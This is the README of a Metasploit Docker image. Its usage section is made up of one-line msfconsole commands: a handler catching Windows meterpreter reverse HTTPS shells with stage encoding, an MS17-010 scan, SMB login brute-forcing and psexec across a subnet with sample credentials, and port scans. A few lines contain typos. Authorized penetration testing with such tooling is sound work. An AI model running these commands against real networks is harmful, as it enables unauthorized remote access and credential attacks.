# METASPLOIT DOCKER IMAGE

Docker image running metasploit.

For `metasploit` licence please read: [metasploit license](https://github.com/rapid7/metasploit-framework/blob/master/LICENSE)


# Usage

* run metasploit container

```bash
docker run -it --rm -v $PWD:/share boogy/metasploit
```

* run a complete meterpreter handler with port mapping and filesystem share

```bash
docker run -it --rm -p 80 -p 8080 -p 443 -p 8443 -v $PWD:/share boogy/metasploit msfconsole -x "spool /metasploit.log; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.60.200; set LPORT 443; set ExitOnSession false; set EnableStageEncoding true; set StageEncoder x64/zutto_dekiru; exploit -j -z"
```

* run metasploit container with ports mapped

```bash
docker run -it --rm -p 443 -p 8443 -v $PWD:/share boogy/metasploit
```

* http_version scanner

```bash
docker run -it --rm boogy/metasploit msfconsole -x "use auxiliary/scanner/http/http_version; set RHOSTS 192.168.10.0/24; set THREADS 10; exploit -j"
```

* MS17-010 scanner

```bash
docker run -it --rm boogy/metasploit msfconsole -x "use auxiliary/scanner/smb/smb_ms17_10; set RHOSTS 192.168.10.0/24; set THREADS 20; exploit -j"
```

* smb_login module

```bash
docker run -it --rm boogy/metasploit msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS 1192.168.10.0/24; set SMBDomain FOO; set SMBPass Passw0rd; set SMBUser foo; set THREADS 20; set DETECT_ANY_AUTH false ; exploit -j"
```

* psexec module

```bash
docker run -it --rm boogy/metasploit msfconsole -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.10.0/24; set SMBDomain FOO; set SMBPass Passw0rd; set SMBUser foo; set THREADS 20; set DETECT_ANY_AUTH false; exploit -j"
```

* tcp port scanner in background

```bash
docker run -it --rm boogy/metasploit msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOST 0.0.0.0/24; set THREADS 30; exploit -j"
```

